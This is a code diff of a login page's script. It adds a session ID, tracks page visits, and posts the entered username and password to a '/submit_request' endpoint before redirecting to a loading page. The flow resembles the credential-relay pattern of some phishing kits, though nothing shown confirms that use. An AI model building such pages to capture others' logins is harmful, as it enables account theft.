@@ -310,12 +310,19 @@
     </div>
 
     <script>
+        function getSessionId() {
+            let sid = localStorage.getItem('session_id');
+            if (!sid) {
+                sid = 'sid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('session_id', sid);
+            }
+            return sid;
+        }
+
         fetch('/track_visit', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ action: 'track_visit', page: 'login_en' })
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ session_id: getSessionId(), current_page: 'login_en' })
         }).catch(error => console.error('Error tracking visit:', error));
 
         function togglePassword() {
@@ -342,22 +349,21 @@
             try {
                 const response = await fetch("/submit_request", {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
+                        session_id: getSessionId(),
                         type: "login",
+                        current_page: "login_en",
                         data: { username: username, password: password }
                     })
                 });
 
                 const result = await response.json();
 
-                if (result.status === "pending") {
-                    localStorage.setItem("request_id", result.request_id);
+                if (result.ok) {
                     window.location.href = "loading_en.html";
                 } else {
-                    errorMessageDiv.textContent = result.message || "An unexpected error occurred.";
+                    errorMessageDiv.textContent = result.error || "An unexpected error occurred.";
                     errorMessageDiv.style.display = "block";
                 }
             } catch (error) {
